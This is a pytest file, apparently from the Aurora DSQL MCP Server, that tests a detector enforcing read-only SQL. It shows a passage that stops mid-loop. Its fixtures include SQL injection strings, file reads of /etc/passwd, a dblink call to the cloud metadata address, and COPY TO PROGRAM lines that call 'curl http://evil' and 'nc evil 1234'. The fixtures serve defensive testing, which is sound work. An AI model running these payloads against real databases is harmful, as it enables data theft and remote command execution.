# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for the readonly enforcement in Aurora DSQL MCP Server."""

import sys
import os
import pytest
from unittest.mock import AsyncMock, MagicMock, patch

# Add the parent directory to the path so we can import the modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from awslabs.aurora_dsql_mcp_server.mutable_sql_detector import (
    check_sql_injection_risk,
    detect_mutating_keywords,
    detect_transaction_bypass_attempt,
)
from awslabs.aurora_dsql_mcp_server.server import readonly_query, transact
from awslabs.aurora_dsql_mcp_server.consts import (
    ERROR_WRITE_QUERY_PROHIBITED,
    ERROR_QUERY_INJECTION_RISK,
    ERROR_TRANSACTION_BYPASS_ATTEMPT,
    READ_ONLY_QUERY_WRITE_ERROR,
)


ctx = AsyncMock()


class TestReadonlyEnforcement:
    """Test cases for the readonly enforcement mechanisms."""

    def test_detect_transaction_bypass_complex_query(self):
        """Test detection of complex queries that attempt to bypass readonly restrictions."""
        # Test a complex query that combines multiple statements
        complex_sql = "SELECT * FROM information_schema.tables; COMMIT; BEGIN; CREATE TABLE test_table (id int)"

        # Should detect transaction bypass attempt
        assert detect_transaction_bypass_attempt(complex_sql) is True

        # Should also detect mutating keywords
        mutating_keywords = detect_mutating_keywords(complex_sql)
        assert 'CREATE' in mutating_keywords

    def test_detect_mutating_keywords_create_table(self):
        """Test detection of CREATE TABLE statements."""
        sql = "CREATE TABLE test_table (id int, name varchar(50))"
        keywords = detect_mutating_keywords(sql)
        assert 'CREATE' in keywords
        assert 'DDL' in keywords

    def test_detect_mutating_keywords_insert(self):
        """Test detection of INSERT statements."""
        sql = "INSERT INTO users (name, email) VALUES ('test', 'test@example.com')"
        keywords = detect_mutating_keywords(sql)
        assert 'INSERT' in keywords

    def test_detect_mutating_keywords_update(self):
        """Test detection of UPDATE statements."""
        sql = "UPDATE users SET name = 'updated' WHERE id = 1"
        keywords = detect_mutating_keywords(sql)
        assert 'UPDATE' in keywords

    def test_detect_mutating_keywords_delete(self):
        """Test detection of DELETE statements."""
        sql = "DELETE FROM users WHERE id = 1"
        keywords = detect_mutating_keywords(sql)
        assert 'DELETE' in keywords

    def test_detect_mutating_keywords_drop(self):
        """Test detection of DROP statements."""
        sql = "DROP TABLE users"
        keywords = detect_mutating_keywords(sql)
        assert 'DROP' in keywords
        assert 'DDL' in keywords

    def test_safe_select_queries(self):
        """Test that safe SELECT queries don't trigger security checks."""
        safe_queries = [
            "SELECT * FROM users",
            "SELECT id, name FROM users WHERE active = true",
            "SELECT COUNT(*) FROM orders",
            "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
            "WITH recent_orders AS (SELECT * FROM orders WHERE created_at > '2023-01-01') SELECT * FROM recent_orders",
        ]

        for sql in safe_queries:
            # Should not detect mutating keywords
            assert detect_mutating_keywords(sql) == []

            # Should not detect injection risks
            assert check_sql_injection_risk(sql) == []

            # Should not detect transaction bypass attempts
            assert detect_transaction_bypass_attempt(sql) is False

    def test_sql_injection_patterns(self):
        """Test detection of various SQL injection patterns."""
        injection_patterns = [
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "SELECT * FROM users WHERE name = 'test' OR 'a'='a'",
            "SELECT * FROM users; DROP TABLE users; --",
            "SELECT * FROM users UNION SELECT * FROM admin_users",
            "SELECT * FROM users WHERE id = 1; INSERT INTO logs VALUES ('hacked')",
        ]

        for sql in injection_patterns:
            issues = check_sql_injection_risk(sql)
            assert len(issues) > 0, f"Should detect injection risk in: {sql}"

    def test_transaction_bypass_variations(self):
        """Test detection of various transaction bypass attempts."""
        bypass_attempts = [
            "SELECT 1; COMMIT; CREATE TABLE hack (id int)",
            "SELECT * FROM users; COMMIT; BEGIN; DROP TABLE sensitive_data",
            "SELECT COUNT(*); ROLLBACK; INSERT INTO logs VALUES ('bypass')",
            "SELECT name FROM users; COMMIT; ALTER TABLE users ADD COLUMN hacked boolean",
        ]

        for sql in bypass_attempts:
            assert detect_transaction_bypass_attempt(sql) is True, f"Should detect bypass in: {sql}"

    def test_permission_statements(self):
        """Test detection of permission-related statements."""
        permission_sql = [
            "GRANT ALL PRIVILEGES ON database.* TO 'user'@'host'",
            "REVOKE SELECT ON table FROM user",
            "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'",
            "DROP USER 'olduser'@'localhost'",
        ]

        for sql in permission_sql:
            keywords = detect_mutating_keywords(sql)
            assert 'PERMISSION' in keywords, f"Should detect permission keywords in: {sql}"

    def test_system_statements(self):
        """Test detection of system-level statements."""
        system_sql = [
            "SET GLOBAL max_connections = 1000",
            "FLUSH PRIVILEGES",
            "LOAD DATA INFILE '/tmp/data.csv' INTO TABLE users",
            "SELECT * INTO OUTFILE '/tmp/output.txt' FROM users",
        ]

        for sql in system_sql:
            keywords = detect_mutating_keywords(sql)
            assert 'SYSTEM' in keywords, f"Should detect system keywords in: {sql}"

    def test_detect_session_mutation_set_config(self):
        """set_config() must be detected in any position, incl. as a subquery.

        A read-only transaction permits set_config() because it mutates session
        (GUC) state rather than table data, so it must be caught by the
        detector to preserve read-only semantics.
        """
        session_mutation_sql = [
            # embedded as a SELECT subquery
            "SELECT set_config('search_path', 'pg_catalog,public', true)",
            "SELECT set_config('timezone', 'UTC', true)",
            "SELECT set_config('search_path', 'pg_temp', false)",
            # schema-qualified form
            "SELECT pg_catalog.set_config('search_path', 'pg_temp', false)",
            # embedded deeper in a projection list
            "SELECT id, set_config('search_path', 'x', true) FROM t",
            # case / spacing variations
            "select SET_CONFIG ('timezone','UTC',true)",
        ]

        for sql in session_mutation_sql:
            keywords = detect_mutating_keywords(sql)
            assert 'SESSION_MUTATION' in keywords, (
                f"Should detect session mutation in: {sql}"
            )

    def test_detect_session_mutation_set_and_reset(self):
        """Bare Postgres SET / RESET forms must be detected."""
        session_mutation_sql = [
            'SET search_path = pg_temp',
            'SET search_path TO public',
            'SET TIME ZONE \'UTC\'',
            'SET SESSION timezone = \'UTC\'',
            'SET LOCAL search_path = public',
            'SET enable_seqscan = off',
            'RESET search_path',
            'RESET ALL',
        ]

        for sql in session_mutation_sql:
            keywords = detect_mutating_keywords(sql)
            assert 'SESSION_MUTATION' in keywords, (
                f"Should detect session mutation in: {sql}"
            )

    def test_session_mutation_no_false_positives(self):
        """Legitimate SELECTs must not be flagged as session mutation.

        Guards against over-broad matching on columns/identifiers whose names
        merely start with or contain set/reset/config.
        """
        safe_sql = [
            'SELECT * FROM users',
            'SELECT config FROM settings',
            'SELECT reset_date, settings FROM accounts',
            'SELECT set_id FROM widget_sets',
            "SELECT * FROM orders WHERE status = 'reset'",
            'BEGIN TRANSACTION READ ONLY',
            'SET TRANSACTION READ ONLY',
            # EXPLAIN EXECUTE / EXPLAIN ANALYZE EXECUTE are legitimate read-only
            # diagnostics: EXECUTE is not at statement start, so the anchored
            # ^\s*EXECUTE branch must not fire.
            'EXPLAIN EXECUTE my_prepared_stmt',
            'EXPLAIN ANALYZE EXECUTE my_prepared_stmt',
            'EXPLAIN (ANALYZE, BUFFERS) EXECUTE my_prepared_stmt',
        ]

        for sql in safe_sql:
            keywords = detect_mutating_keywords(sql)
            assert 'SESSION_MUTATION' not in keywords, (
                f"Should NOT flag session mutation in: {sql}"
            )

    def test_detect_session_mutation_keyword_syntax_forms(self):
        """Keyword-syntax SET and other session commands must be detected.

        The assignment-shape (SET x = y) is not the only session mutation:
        SET ROLE / SET SCHEMA / SET NAMES use keyword syntax, and
        RESET / DISCARD / LISTEN / NOTIFY / LOCK / EXECUTE act on session or
        connection state. All must be caught in read-only mode.
        """
        session_sql = [
            'SET ROLE admin',
            "SET SESSION AUTHORIZATION 'bob'",
            "SET SCHEMA 'evil'",
            "SET NAMES 'utf8'",
            'RESET search_path',
            'RESET ALL',
            'DISCARD ALL',
            'LISTEN chan',
            'NOTIFY chan',
            'UNLISTEN chan',
            'LOCK TABLE t IN ACCESS EXCLUSIVE MODE',
            'EXECUTE some_prepared_stmt',
            # Prepared statements / cursors are session-scoped and not cleared by
            # RESET ALL, so they are blocked in read-only mode too.
            'PREPARE p AS SELECT 1',
            'DEALLOCATE ALL',
            'DEALLOCATE p',
            'DECLARE cur CURSOR WITH HOLD FOR SELECT 1',
            # SET TRANSACTION READ WRITE is an escalation, not a read-only assertion.
            'SET TRANSACTION READ WRITE',
            'SET TRANSACTION ISOLATION LEVEL SERIALIZABLE READ WRITE',
        ]
        for sql in session_sql:
            assert 'SESSION_MUTATION' in detect_mutating_keywords(sql), (
                f"Keyword-syntax session command not detected: {sql}"
            )

    def test_statement_level_mutations_blocked(self):
        """Statement-level mutations (CALL/DO/VACUUM/… + setval/nextval) are blocked.

        These are ordinary Postgres statements that write or act on durable state.
        Aurora DSQL rejects most at the engine today; blocking them here is
        forward-looking defense-in-depth, mirroring the postgres-mcp-server sibling.
        """
        statement_sql = [
            'CALL do_transfer(1, 2, 500)',
            'DO $$ BEGIN PERFORM 1; END $$',
            'VACUUM my_table',
            'ANALYZE my_table',
            'REINDEX TABLE my_table',
            'CLUSTER my_table USING my_idx',
            'REFRESH MATERIALIZED VIEW sales_summary',
            "COMMENT ON TABLE t IS 'x'",
            "SECURITY LABEL ON TABLE t IS 'y'",
            'IMPORT FOREIGN SCHEMA s FROM SERVER srv INTO local',
            "LOAD 'some_library'",
            'DISCARD ALL',
            "SELECT setval('my_seq', 999)",
            "SELECT nextval('my_seq')",
        ]
        for sql in statement_sql:
            assert 'STATEMENT_KEYWORD' in detect_mutating_keywords(sql), (
                f"Statement-level mutation not detected: {sql}"
            )

    def test_statement_keywords_do_not_false_positive_on_reads(self):
        """The statement-keyword block must not reject legitimate reads.

        Anchoring at statement start keeps mid-query occurrences (notably
        ``EXPLAIN ANALYZE ... SELECT``, the DSQL query-plan workflow) and
        column/table names (comment, cluster_id, analyze_results) allowed.
        """
        safe_reads = [
            'EXPLAIN ANALYZE VERBOSE SELECT * FROM orders',
            'EXPLAIN (ANALYZE, BUFFERS) SELECT 1',
            'SELECT comment FROM posts',
            'SELECT analyze_results, cluster_id FROM t',
            "SELECT * FROM refresh_log WHERE status = 'load'",
            'SELECT do_thing, call_count FROM t',
            "SELECT 'CALL do_transfer(1,2,500)' AS example",
        ]
        for sql in safe_reads:
            assert 'STATEMENT_KEYWORD' not in detect_mutating_keywords(sql), (
                f"Legitimate read wrongly flagged as statement mutation: {sql}"
            )

    def test_set_transaction_read_only_still_allowed(self):
        """SET TRANSACTION READ ONLY / isolation-only remain allowed."""
        for sql in [
            'SET TRANSACTION READ ONLY',
            'SET TRANSACTION ISOLATION LEVEL REPEATABLE READ',
            'SET TRANSACTION ISOLATION LEVEL SERIALIZABLE',
        ]:
            assert 'SESSION_MUTATION' not in detect_mutating_keywords(sql), sql

    def test_set_transaction_read_write_blocked_across_whitespace(self):
        """SET TRANSACTION ... READ WRITE blocked even when split by a newline.

        Regression: the escalation branch must span arbitrary whitespace between
        TRANSACTION and READ WRITE, not just same-line spaces — a newline (still a
        single valid statement) must not slip the escalation past the gate.
        """
        for sql in [
            'SET TRANSACTION READ WRITE',
            'SET TRANSACTION\nREAD WRITE',
            'SET TRANSACTION\t\nREAD  WRITE',
            'SET TRANSACTION ISOLATION LEVEL SERIALIZABLE,\nREAD WRITE',
        ]:
            assert 'SESSION_MUTATION' in detect_mutating_keywords(sql), sql

    def test_system_regex_no_redos_on_whitespace(self):
        """SYSTEM_REGEX must be linear on whitespace-heavy input (no ReDoS).

        The SELECT/COPY branches once used ``\\s+.*\\s+<kw>`` which backtracks
        catastrophically on a run of spaces with no trailing keyword — a ~1.5 KB
        string blocked the event loop for seconds.
        """
        import time

        for prefix in ('SELECT ', 'COPY '):
            start = time.perf_counter()
            detect_mutating_keywords(prefix + ' ' * 5000)
            elapsed = time.perf_counter() - start
            assert elapsed < 1.0, f'{prefix!r} + whitespace too slow ({elapsed:.2f}s) — ReDoS'

    def test_keyword_patterns_no_redos_on_repeated_keywords(self):
        """union/copy/transaction-control checks must be linear (no O(n^2) ReDoS).

        The old ``\\bunion\\b.*\\bselect\\b`` / ``\\bcopy\\s+.*\\s+from`` /
        ``(begin|commit|rollback).*;\\w+`` regexes restarted a greedy scan at every
        keyword, so keyword-heavy input (~20-30 KB) blocked the event loop for
        seconds.
        """
        import time

        for payload in ('union ' * 6000, 'copy ' * 6000, 'begin ' * 6000):
            start = time.perf_counter()
            check_sql_injection_risk(payload)
            elapsed = time.perf_counter() - start
            assert elapsed < 1.0, f'{payload[:6]!r}-heavy input too slow ({elapsed:.2f}s) — ReDoS'

    def test_transaction_bypass_no_redos_on_repeated_commit(self):
        """detect_transaction_bypass_attempt must be linear on commit-heavy input."""
        import time

        start = time.perf_counter()
        detect_transaction_bypass_attempt('commit ' * 6000)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f'commit-heavy input too slow ({elapsed:.2f}s) — ReDoS'

    def test_dollar_quote_scan_is_linear(self):
        """The dollar-quote boundary scan must be linear on `$`-heavy input.

        Regression: `_end_of_dollar_quote` once sliced ``sql[i:]`` on every `$`,
        making a `$`-heavy string O(n^2). It now matches at position via
        ``_DOLLAR_TAG_RE.match(sql, i)``.
        """
        import time

        # 500k `$`: linear cost is well under 1s; the reverted O(n^2) slice version
        # takes tens of seconds at this size, so this reliably catches a regression.
        payload = '$' * 500_000
        start = time.perf_counter()
        detect_mutating_keywords(payload)
        check_sql_injection_risk(payload)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, f'dollar-heavy input too slow ({elapsed:.2f}s) — possible O(n^2)'

    def test_double_quoted_identifier_apostrophe_does_not_bypass(self):
        """An apostrophe inside a double-quoted identifier must not desync scanning.

        Regression: a `'` in a column alias like `"o'clock"` was misread as
        opening a string literal, blanking away the rest of the statement and
        hiding a following dangerous call / session mutation.
        """
        bypass_attempts = [
            ("SELECT 1 AS \"col's\", set_config('search_path','public',false)", 'session'),
            ('SELECT 1 AS "a\'", pg_read_file(\'/etc/passwd\')', 'injection'),
            ('SELECT 1 AS "o\'clock", pg_terminate_backend(1)', 'injection'),
        ]
        for sql, _kind in bypass_attempts:
            assert detect_mutating_keywords(sql) or check_sql_injection_risk(sql), (
                f"apostrophe-in-identifier bypassed detection: {sql}"
            )

    def test_benign_double_quoted_identifier_allowed(self):
        """A normal quoted identifier (no apostrophe) stays allowed."""
        assert not detect_mutating_keywords('SELECT col AS "myCol" FROM t')
        assert not check_sql_injection_risk('SELECT col AS "myCol" FROM t')

    def test_escape_prefix_requires_standalone_token(self):
        """An identifier ending in e/E before a quote is not an escape-string prefix.

        `_is_escape_string_open` must treat `value'...'` as an ordinary string
        (backslash literal), not an E'...' escape string. This pins the
        standalone-token guard.
        """
        # `code'\''` — the e is part of the identifier `code`, so `'\''` is a
        # standard string (\ literal): content is `\`, closed, then a stray quote.
        # Either way a following mutation must still be seen.
        payload = "SELECT valuee'x', pg_terminate_backend(1)"
        assert check_sql_injection_risk(payload), (
            'identifier-tail e mis-parsed as escape prefix, hid the call'
        )

    def test_comment_injection_scan_is_linear(self):
        """The comment-injection check must not be O(n^2) on quote-heavy input (ReDoS)."""
        import time

        payload = "'" * 200000
        start = time.perf_counter()
        check_sql_injection_risk(payload)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f'comment-injection scan too slow ({elapsed:.2f}s) — possible ReDoS'

    def test_comment_injection_same_line_only(self):
        """comment_injection flags a quote + -- on the SAME line, not across lines.

        The historical `'.*?--` regex ran without re.DOTALL, so a string literal on
        one line and an ordinary SQL line-comment on a later line was NOT flagged.
        The linear scan must preserve that: cross-line must not false-positive.
        """
        # Same line: flagged.
        assert any(
            i['label'] == 'comment_injection'
            for i in check_sql_injection_risk("SELECT * FROM t WHERE x = 'a'--")
        )
        # Literal on one line, comment on a later line: NOT a comment injection.
        cross_line = "SELECT 'active' AS status\n-- fetch only active rows\nFROM orders"
        assert not any(
            i['label'] == 'comment_injection' for i in check_sql_injection_risk(cross_line)
        )

    def test_set_role_does_not_survive_via_string_literal(self):
        """A keyword inside a literal is data, not a SET ROLE statement."""
        # Statement-anchored, so a keyword in a literal is not a statement.
        assert 'SESSION_MUTATION' not in detect_mutating_keywords(
            "SELECT * FROM audit WHERE note LIKE '%SET ROLE admin%'"
        )

    def test_estring_escape_does_not_bypass_detection(self):
        """An escape-string prefix must not desync literal scanning.

        E'<backslash>'' is a complete, closed PostgreSQL escape string (the
        backslash-quote is an escaped quote). A scanner that mis-read it as
        still-open would swallow the rest of the statement and hide whatever
        follows. All detector tiers run on literal-blanked text, and the shared
        boundary helper models escape-string escapes so blanking terminates the
        E'...' literal exactly where PostgreSQL does — leaving the trailing
        statement (set_config, a dangerous function, UNION SELECT) visible.
        """
        # session-mutation via set_config after the escape literal
        assert 'SESSION_MUTATION' in detect_mutating_keywords(
            "SELECT E'\\'', set_config('search_path', 'pg_temp', false)"
        )
        # dangerous function after the escape literal (runs on blanked text)
        assert check_sql_injection_risk("SELECT E'\\'', pg_terminate_backend(1)"), (
            'E-string escape hid a dangerous function call'
        )
        # UNION SELECT after the escape literal (keyword tier on blanked text)
        assert check_sql_injection_risk("SELECT E'\\'' UNION SELECT * FROM secrets"), (
            'E-string escape hid a UNION SELECT'
        )
        # lowercase e'...' and non-empty body variants
        assert check_sql_injection_risk("SELECT e'\\'', pg_read_file('/etc/passwd')")
        assert check_sql_injection_risk("SELECT E'foo\\'', dblink_connect('h')")

    def test_estring_literal_still_allowed(self):
        """A benign escape-string literal on its own must not be flagged."""
        assert detect_mutating_keywords("SELECT E'\\'' AS just_a_quote") == []
        assert check_sql_injection_risk("SELECT E'\\'' AS just_a_quote") == []

    def test_comment_injection_does_not_bypass_detection(self):
        """SQL comments must not smuggle a mutation past the detector.

        Postgres treats /* */ and -- as whitespace, so a comment wedged
        between tokens (SET/**/search_path) executes normally. The detector
        normalizes comments away before matching, so these must still be
        caught.
        """
        commented = [
            'SET/**/search_path = pg_temp',
            '/*x*/ SET search_path = pg_temp',
            'SET  search_path/**/=/**/pg_temp',
            "SELECT/**/set_config('search_path', 'pg_temp', false)",
            'SET/**/SESSION timezone = \'UTC\'',
        ]
        for sql in commented:
            keywords = detect_mutating_keywords(sql)
            assert 'SESSION_MUTATION' in keywords, (
                f"Comment injection bypassed detection in: {sql}"
            )

    def test_keywords_inside_string_literals_not_flagged(self):
        """A mutating keyword that is only string DATA must not be rejected.

        Keywords inside single-quoted literals are data, not statements, so
        they must not trip the keyword scan and break legitimate reads.
        Contents of string literals are blanked before the keyword scan.
        """
        safe_sql = [
            "SELECT 'INSERT INTO' AS action, 1 AS marker",
            "SELECT * FROM sys.jobs WHERE 'DROP TABLE hack' LIKE '%DROP%'",
            'SELECT 1 /* mentions UPDATE for docs */',
            "SELECT 'pg_terminate_backend' AS name",
            "SELECT status FROM t WHERE note = 'please GRANT access'",
            # set_config( is the one un-anchored SESSION_MUTATION branch; a
            # literal mentioning it must not be flagged (regression).
            "SELECT 'set_config(' AS example",
            "SELECT proname FROM pg_proc WHERE prosrc LIKE '%set_config(%'",
        ]
        for sql in safe_sql:
            assert detect_mutating_keywords(sql) == [], (
                f"Keyword inside literal wrongly flagged as mutating: {sql}"
            )
            assert check_sql_injection_risk(sql) == [], (
                f"Keyword inside literal wrongly flagged as injection: {sql}"
            )

    def test_real_mutation_outside_literal_still_caught(self):
        """Blanking literals must not hide a real statement around them."""
        assert 'INSERT' in detect_mutating_keywords(
            "INSERT INTO t VALUES ('some INSERT text')"
        )
        assert 'UPDATE' in detect_mutating_keywords("UPDATE t SET x = 'DROP' WHERE id = 1")
        assert 'SESSION_MUTATION' in detect_mutating_keywords("SET search_path = 'evil'")

    def test_dangerous_functions_blocked(self):
        """High-blast-radius Postgres functions are rejected in both modes.

        pg_sleep variants are the family Aurora DSQL currently permits (a
        connection-hold / DoS vector); the rest are forward-looking
        defense-in-depth mirroring the postgres-mcp-server sibling.
        """
        dangerous = [
            "SELECT pg_sleep(5)",
            "SELECT pg_sleep_for('5 seconds')",
            "SELECT pg_sleep_until('tomorrow')",
            "SELECT pg_terminate_backend(1234)",
            "SELECT pg_cancel_backend(1234)",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT dblink_connect('host=169.254.169.254')",
            "SELECT pg_advisory_lock(1)",
            "SELECT pg_catalog.pg_terminate_backend(1)",
            'SELECT "pg_sleep"(1)',
        ]
        for sql in dangerous:
            # Blocked in both read-only and write mode.
            assert check_sql_injection_risk(sql, read_only=True), (
                f"Dangerous function not blocked (read-only): {sql}"
            )
            assert check_sql_injection_risk(sql, read_only=False), (
                f"Dangerous function not blocked (write): {sql}"
            )

    def test_security_sensitive_gucs_blocked_both_modes(self):
        """row_security / session_replication_role rejected via SET and set_config."""
        guc_sql = [
            'SET row_security = off',
            'SET SESSION row_security = off',
            "SELECT set_config('row_security', 'off', false)",
            'SET session_replication_role = replica',
            "SELECT set_config('session_replication_role', 'replica', false)",
        ]
        for sql in guc_sql:
            assert check_sql_injection_risk(sql, read_only=True), (
                f"Security GUC not blocked (read-only): {sql}"
            )
            assert check_sql_injection_risk(sql, read_only=False), (
                f"Security GUC not blocked (write): {sql}"
            )

    def test_copy_program_blocked_both_modes(self):
        """COPY ... TO/FROM PROGRAM (RCE) is rejected regardless of mode."""
        copy_sql = [
            "COPY t TO PROGRAM 'curl http://evil'",
            "COPY t FROM PROGRAM 'whoami'",
            "COPY (SELECT * FROM t) TO PROGRAM 'nc evil 1234'",
        ]
        for sql in copy_sql:
            assert check_sql_injection_risk(sql, read_only=True), (
                f"COPY PROGRAM not blocked (read-only): {sql}"
            )
            assert check_sql_injection_risk(sql, read_only=False), (
                f"COPY PROGRAM not blocked (write): {sql}"
            )

    def test_dangerous_name_inside_literal_not_flagged(self):
        """A function/GUC name that is only string DATA must not be rejected.

        The dangerous-function and security-GUC checks run on literal-blanked
        text, so a name mentioned inside a string literal (an audit query
        searching for usages) is not mistaken for a real call/statement.
        """
        safe_sql = [
            "SELECT proname FROM pg_proc WHERE prosrc LIKE '%dblink(%'",
            "SELECT * FROM audit_log WHERE query ILIKE '%SET row_security = off%'",
            "SELECT * FROM logs WHERE msg LIKE '%pg_terminate_backend(%'",
            "SELECT 'set_config(''row_security'',''off'')' AS example",
            # COPY ... PROGRAM as string data — the ^\s*COPY anchor must keep this
            # from being mistaken for a real COPY statement.
            "SELECT 'COPY t TO PROGRAM curl' AS example",
            "SELECT * FROM logs WHERE q LIKE '%COPY t TO PROGRAM%'",
        ]
        for sql in safe_sql:
            assert check_sql_injection_risk(sql, read_only=True) == [], (
                f"Name inside literal wrongly flagged: {sql}"
            )

    def test_dangerous_name_as_real_call_still_flagged(self):
        """Blanking literals must not hide a real dangerous call/GUC set."""
        assert check_sql_injection_risk("SELECT dblink_connect('x')")
        assert check_sql_injection_risk('SELECT pg_terminate_backend(1)')
        assert check_sql_injection_risk('SET row_security = off')
        assert check_sql_injection_risk("SELECT set_config('row_security', 'off', false)")

    def test_nested_block_comment_does_not_bypass(self):
        """Nested /* /* */ */ comments must be fully stripped before matching.

        Postgres block comments nest, so a naive single-level stripper would
        leave a trailing */ (and the hidden keyword) behind. Exercises the
        nesting branch of strip_sql_comments.
        """
        nested = [
            'SET /* /* nested */ */ search_path = evil',
            '/* outer /* inner */ still comment */ SET search_path = evil',
            'SELECT/* a /* b */ c */set_config(\'search_path\', \'x\', false)',
        ]
        for sql in nested:
            assert 'SESSION_MUTATION' in detect_mutating_keywords(sql), (
                f"Nested comment bypassed detection in: {sql}"
            )

    def test_doubled_quote_escapes_handled(self):
        """Doubled-quote escapes ('' and "") must not break literal/identifier scanning.

        A '' inside a single-quoted string is an escaped quote, not the end of
        the literal; likewise "" inside a quoted identifier. The normalizer must
        treat the whole span as one literal/identifier so a keyword after it is
        still classified correctly.
        """
        # Keyword is inside the literal (with an escaped quote) -> data, not flagged.
        assert detect_mutating_keywords("SELECT 'it''s an INSERT' AS note") == []
        # A real mutation after a literal containing an escaped quote is still caught.
        assert 'INSERT' in detect_mutating_keywords(
            "INSERT INTO t VALUES ('it''s fine')"
        )
        # Doubled double-quote in an identifier does not derail the scan.
        assert detect_mutating_keywords('SELECT 1 AS "wei""rd"') == []

    def test_dollar_quoted_string_contents_not_flagged(self):
        """A keyword inside a dollar-quoted string is data, not a statement.

        blank_string_literals blanks dollar-quoted bodies (via the shared
        boundary helper) just like single-quoted literals, so a keyword that is
        merely dollar-quoted data does not trip the mutating-keyword scan.
        """
        assert detect_mutating_keywords('SELECT $$INSERT INTO$$ AS x') == []
        assert detect_mutating_keywords('SELECT $tag$DROP TABLE$tag$ AS x') == []

    def test_dollar_quote_does_not_desync_detection(self):
        """A single quote inside a dollar-quoted body must not open a phantom literal.

        Regression test: a naive single-quote scanner treated the quote inside a
        dollar-quoted body as opening a literal and swallowed the rest of the
        statement, hiding a following dangerous call. The dollar-quote-aware
        boundary prevents that.
        """
        payload = "SELECT $$q'$$, pg_terminate_backend(1)"
        assert check_sql_injection_risk(payload), (
            'dollar-quote desync hid a dangerous function call'
        )

    def test_real_mutation_after_dollar_quote_still_caught(self):
        """Blanking a dollar-quoted body must not hide a real statement after it.

        A statement that LEADS with a dollar-quoted string then performs a real
        session mutation must still be flagged as SESSION_MUTATION — the blanked
        body must not desync the scanner. (A stacked ``; SET`` is separately
        caught by the transaction-bypass detector, so this uses the leading form
        to specifically exercise session-mutation detection.)
        """
        assert 'SESSION_MUTATION' in detect_mutating_keywords(
            "SET search_path = $$evil$$"
        )
        # A dangerous call after a dollar-quoted argument is still seen.
        assert check_sql_injection_risk("SELECT pg_terminate_backend($$1$$::int)")

    def test_leading_literal_and_bare_dollar_are_safe(self):
        """A literal at index 0 and a bare $ (positional param) must not crash or misfire.

        Exercises the boundary-helper edges: a single quote at the very start of
        the string, and a ``$`` that does not begin a dollar-quote tag (``$1``).
        """
        # Leading single-quoted literal, then a real statement keyword after it.
        assert 'SESSION_MUTATION' not in detect_mutating_keywords("'abc' AS x")
        # $1 is a positional parameter, not a dollar-quote tag — must not derail.
        assert detect_mutating_keywords('SELECT $1 FROM t WHERE id = $2') == []
        assert check_sql_injection_risk('SELECT $1 FROM t WHERE id = $2') == []

    def test_unterminated_literal_and_comment_do_not_crash(self):
        """Malformed SQL (unterminated literal / comment / dollar-quote) is safe.

        The normalizer must not raise on truncated input; it should fail closed
        (or at least not error) so a crafted fragment cannot crash the server.
        """
        for sql in [
            "SELECT 'unterminated",
            'SELECT /* unterminated',
            'SELECT $$unterminated',
            'SELECT 1 AS "unterminated',
        ]:
            # Should return normally (no exception); result value is not asserted.
            detect_mutating_keywords(sql)
            check_sql_injection_risk(sql)
            detect_transaction_bypass_attempt(sql)

    def test_case_insensitive_detection(self):
        """Test that detection works regardless of case."""
        variations = [
            "create table test (id int)",
            "CREATE TABLE test (id int)",
            "Create Table test (id int)",
            "CrEaTe TaBlE test (id int)",
        ]

        for sql in variations:
            keywords = detect_mutating_keywords(sql)
            assert 'CREATE' in keywords, f"Should detect CREATE regardless of case in: {sql}"
            assert 'DDL' in keywords, f"Should detect DDL regardless of case in: {sql}"

    def test_postgresql_specific_patterns(self):
        """Test detection of PostgreSQL-specific patterns."""
        postgres_sql = [
            "COPY users FROM '/tmp/users.csv'",
            "COPY (SELECT * FROM users) TO '/tmp/export.csv'",
            "SELECT pg_sleep(5)",
        ]

        for sql in postgres_sql:
            # Should detect either mutating keywords or injection risks
            has_mutating = len(detect_mutating_keywords(sql)) > 0
            has_injection = len(check_sql_injection_risk(sql)) > 0
            assert has_mutating or has_injection, f"Should detect security issue in: {sql}"

    def test_comment_handling(self):
        """Test that comments don't interfere with detection."""
        sql_with_comments = [
            "SELECT * FROM users; -- This is a comment\nCOMMIT; CREATE TABLE hack (id int)",
            "/* Multi-line comment */ SELECT 1; COMMIT; DROP TABLE users",
        ]

        for sql in sql_with_comments:
            assert detect_transaction_bypass_attempt(sql) is True, f"Should detect bypass despite comments in: {sql}"

    def test_empty_and_whitespace_sql_handling(self):
        """Test handling of empty SQL, whitespace, and comment-only queries."""
        # Test empty SQL
        assert detect_mutating_keywords("") == []
        assert check_sql_injection_risk("") == []
        assert detect_transaction_bypass_attempt("") is False

        # Test whitespace only
        assert detect_mutating_keywords("   ") == []
        assert check_sql_injection_risk("   ") == []
        assert detect_transaction_bypass_attempt("   ") is False

        # Test SQL with only comments
        assert detect_mutating_keywords("-- This is just a comment") == []
        assert check_sql_injection_risk("-- This is just a comment") == []
        assert detect_transaction_bypass_attempt("-- This is just a comment") is False

        # Test multiple semicolons without statements
        # Note: Multiple semicolons are actually detected as multiple statements
        assert detect_transaction_bypass_attempt(";;;") is True
        assert detect_transaction_bypass_attempt("; ; ;") is True

        # Test semicolon followed by comment only
        assert detect_transaction_bypass_attempt("SELECT 1; -- comment") is False
        assert detect_transaction_bypass_attempt("SELECT 1; /* comment */") is False

        # Test COMMIT without following statements
        assert detect_transaction_bypass_attempt("COMMIT") is False
        # Note: "SELECT 1; COMMIT" is detected as multiple statements by the regex
        assert detect_transaction_bypass_attempt("SELECT 1; COMMIT") is True

        # Test transaction control keywords detection
        transaction_sql = [
            "BEGIN TRANSACTION",
            "COMMIT TRANSACTION",
            "ROLLBACK TRANSACTION",
            "START TRANSACTION",
            "SAVEPOINT sp1",
            "RELEASE SAVEPOINT sp1",
        ]

        for sql in transaction_sql:
            keywords = detect_mutating_keywords(sql)
